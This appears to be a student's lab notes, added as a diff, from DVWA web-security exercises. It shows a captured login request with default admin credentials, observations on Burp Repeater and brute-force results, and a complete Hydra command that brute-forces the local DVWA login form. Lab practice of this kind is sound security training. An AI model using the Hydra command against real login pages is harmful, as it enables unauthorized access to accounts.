@@ -1,0 +1,38 @@
+raw:
+POST /login.php HTTP/1.1
+Host: localhost
+Content-Length: 88
+Cache-Control: max-age=0
+sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Accept-Language: fi-FI,fi;q=0.9
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Tommy Meriläinen jakkara
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/login.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=dnrpkukp4ijpcdkpgqkas8c4k6; security=low
+Connection: keep-alive
+
+username=admin&password=password&Login=Login&user_token=0c265cc16bc1d50d6bd7b90c8b48b2dc
+
+Task4: repeater
+When I send the request, dvwaSession ID increases by one if multiple sent fast. If I take a little break between
+sending, ID increases by more than one. Think that's because some other people can also increase it.
+
+Task4: brute force
+2 attemps were successful. Content of 2 attemps had longer length and had text "Welcome to the password protected area admin"
+and failed attempts had "Username and/or password incorrect."
+
+Task5: hydra
+command: docker run --network="host" vanhauser/hydra -V -f -I -l admin -x 4:4:a "http-get-form://localhost/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=dnrpkukp4ijpcdkpgqkas8c4k6; security=low:F=Username and/or password incorrect."
+
+start time: 23:25
+end time: 23:31
+
